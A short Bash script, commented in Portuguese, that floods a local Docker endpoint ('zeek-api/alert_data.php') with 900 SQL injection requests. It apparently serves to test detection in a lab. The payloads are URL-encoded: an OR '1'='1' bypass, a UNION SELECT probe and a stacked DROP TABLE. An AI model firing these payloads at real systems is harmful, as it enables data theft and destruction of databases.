#!/bin/bash

# Nome do arquivo de log
LOG_FILE="sql_injection_test.log"

# Função para obter timestamp com alta precisão
get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S.%N"
}

# URL encode special characters
# Single quote ' = %27
# Space = %20
# Semicolon ; = %3B
# Dash - = %2D

echo "=== INÍCIO DO TESTE DE SQL INJECTION ===" | tee -a "$LOG_FILE"
START_TIME=$(get_timestamp)
echo "Tempo de início: $START_TIME" | tee -a "$LOG_FILE"
echo "----------------------------------------" | tee -a "$LOG_FILE"

# Contador de requisições
REQUEST_COUNT=0

for i in {1..300}; do
    REQUEST_COUNT=$((REQUEST_COUNT + 3))
    
    # Timestamp individual para cada grupo de requisições
    GROUP_START=$(get_timestamp)
    
    # URL-ENCODED versions:
    # 1' OR '1'='1'-- becomes 1%27%20OR%20%271%27=%271%27--
    curl -v "http://host.docker.internal:8090/zeek-api/alert_data.php?cat=1%27%20OR%20%271%27=%271%27--" > /dev/null 2>&1 &
    
    # 1 UNION SELECT 1,2,3-- becomes 1%20UNION%20SELECT%201,2,3--
    curl -v "http://host.docker.internal:8090/zeek-api/alert_data.php?cat=1%20UNION%20SELECT%201,2,3--" > /dev/null 2>&1 &
    
    # 1; DROP TABLE teste-- becomes 1%3B%20DROP%20TABLE%20teste--
    curl -v "http://host.docker.internal:8090/zeek-api/alert_data.php?cat=1%3B%20DROP%20TABLE%20teste--" > /dev/null 2>&1 &
    
    echo "Lote $i iniciado: $GROUP_START" >> "$LOG_FILE"
    sleep 0.1
done

# Aguarda todas as requisições terminarem
wait

END_TIME=$(get_timestamp)
echo "----------------------------------------" | tee -a "$LOG_FILE"
echo "Tempo de término: $END_TIME" | tee -a "$LOG_FILE"
echo "Total de requisições: $REQUEST_COUNT" | tee -a "$LOG_FILE"
echo "=== FIM DO TESTE ===" | tee -a "$LOG_FILE"

# Calcula a duração total
DURATION=$(($(date -d "$END_TIME" +%s%N) - $(date -d "$START_TIME" +%s%N)))
DURATION_MS=$((DURATION / 1000000))

echo "Duração total: ${DURATION_MS}ms" | tee -a "$LOG_FILE"
